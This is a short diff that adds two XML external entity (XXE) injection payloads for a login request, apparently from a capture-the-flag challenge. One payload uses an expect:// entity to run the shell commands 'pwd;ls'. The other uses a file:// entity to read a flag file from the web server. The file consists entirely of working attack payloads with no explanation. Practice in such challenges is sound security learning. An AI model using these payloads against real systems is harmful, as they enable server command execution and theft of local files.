@@ -1,0 +1,3 @@
+<!DOCTYPE root [<!ENTITY test SYSTEM 'expect://pwd;ls'>]><LoginRequest><username>&test;</username><password>yeet</password></LoginRequest>
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/html/challenge15/isdhfsdf-flag.txt'>]><LoginRequest><username>&test;</username><password>yeet</password></LoginRequest>
